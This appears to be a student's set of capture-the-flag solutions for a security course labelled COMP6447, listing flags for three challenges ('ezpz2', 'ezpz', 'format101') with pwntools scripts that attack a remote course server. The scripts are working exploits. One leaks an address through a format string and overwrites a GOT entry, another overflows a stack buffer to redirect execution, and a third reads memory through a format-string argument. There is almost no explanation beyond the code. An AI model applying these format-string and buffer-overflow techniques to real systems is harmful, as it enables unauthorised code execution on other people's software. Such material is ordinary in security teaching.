​##ezpz2
COMP6447{This_was_slightly_less_ezpz}

from pwn import *
context.log_level = 'debug'
# p = process('./ezpz2')
p = remote("plzpwn.me","9449")
q = p.recv()
p.sendline('n')
q = p.recv()
q = p.recv()
print "should enter answer now"
fmt = "AAAA.%1$x"
p.sendline(fmt)
q = p.recv()
p.sendline('A')
q = p.recvuntil(".")
ad = p.recvline()[:-1]
winAd = int(ad,16)-10260
gotAd = winAd+9605
log.info("winAd: " + hex(winAd))
log.info("gotAd: " + hex(gotAd))
p.recv()
p.sendline('n')
p.recv()
def pay(q):
    p.sendline(q)
    log.info(repr(q))
form = FmtStr(execute_fmt=pay, offset=8, padlen=3)
form.write(gotAd, winAd)
form.execute_writes()
p.interactive()

## ezpz
COMP6447{This_was_not_ezpz}
from pwn import *
context.terminal = ['tmux', 'splitw', '-h']
# p = process('./ezpz')
p = remote('plzpwn.me','9447')
# gdb.attach(p, gdbscript='break *ask_question+63')
p.recv()
p.sendline('n')
p.recv()
win = 0x8048714
# p.sendline(cyclic(80))
p.sendline(cyclic(72)+p32(win))
q = p.recv()
print q
p.sendline('a')
q = p.recv()
p.interactive()
print q

## format101

COMP6447{1_kn0w_h0w_f0rm4t_str1ng5_w0rk}

from pwn import *
# p = process('./format101')
p = remote('plzpwn.me',"9448")
p.recv()
p.sendline('\x60\xa0\x04\x08'+'%7$s')
print(p.recv())